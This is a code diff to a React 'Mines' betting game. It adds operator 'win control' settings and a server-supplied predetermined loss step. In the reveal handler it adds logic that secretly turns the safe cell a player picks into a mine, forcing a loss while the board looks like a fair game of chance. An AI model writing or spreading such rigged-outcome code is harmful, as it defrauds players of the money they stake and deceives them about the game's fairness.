@@ -6,7 +6,7 @@ import { Link } from 'react-router-dom';
 import { gameApi } from '../../api/gameApi';
 
 export default function Mines() {
-  const { currentUser, updateUserProfile } = useApp();
+  const { currentUser, updateUserProfile, siteSettings } = useApp();
   const { formatCurrency } = useCurrency();
   
   const [bet, setBet] = useState(10);
@@ -18,6 +18,7 @@ export default function Mines() {
   const [currentMultiplier, setCurrentMultiplier] = useState(1.00);
   const [stepMult, setStepMult] = useState(1.10);
   const [revealedCount, setRevealedCount] = useState(0);
+  const [forcedLossStep, setForcedLossStep] = useState<number | null>(null);
 
   const startGame = async () => {
     if (gameState === 'playing' || !currentUser) return;
@@ -26,21 +27,31 @@ export default function Mines() {
     updateUserProfile(currentUser.id, { balance: currentUser.balance - bet });
     
     // Server logic
-    const res = await gameApi.initMines(bet, minesCount);
+    const winControl = (siteSettings?.gameWinControls?.mines as any) || 'medium';
+    const res = await gameApi.initMines(bet, minesCount, winControl);
     
     const newGrid = res.grid.map(isGem => ({ isMine: !isGem, revealed: false }));
     setGrid(newGrid);
     setStepMult(res.multiplierMultiplier);
     setCurrentMultiplier(1.00);
     setRevealedCount(0);
+    setForcedLossStep(res.predeterminedLossStep ?? null);
     setGameState('playing');
   };
 
   const handleReveal = (index: number) => {
     if (gameState !== 'playing' || grid[index].revealed) return;
     
-    const cell = grid[index];
+    let cell = grid[index];
     const newGrid = [...grid];
+    const newRevealedCount = revealedCount + 1;
+
+    // Check if we need to force a loss
+    if (!cell.isMine && forcedLossStep && newRevealedCount >= forcedLossStep) {
+      // Convert this safe cell into a mine to force the loss
+      cell = { ...cell, isMine: true };
+    }
+
     newGrid[index] = { ...cell, revealed: true };
     setGrid(newGrid);
 
@@ -50,12 +61,11 @@ export default function Mines() {
       revealAll();
     } else {
       // Safe!
-      const newRevealed = revealedCount + 1;
-      setRevealedCount(newRevealed);
+      setRevealedCount(newRevealedCount);
       setCurrentMultiplier(prev => parseFloat((prev * stepMult).toFixed(2)));
       
       // Auto-win if all non-mines found
-      if (newRevealed === (25 - minesCount)) {
+      if (newRevealedCount === (25 - minesCount)) {
         handleCashOut(parseFloat((currentMultiplier * stepMult).toFixed(2)));
       }
     }
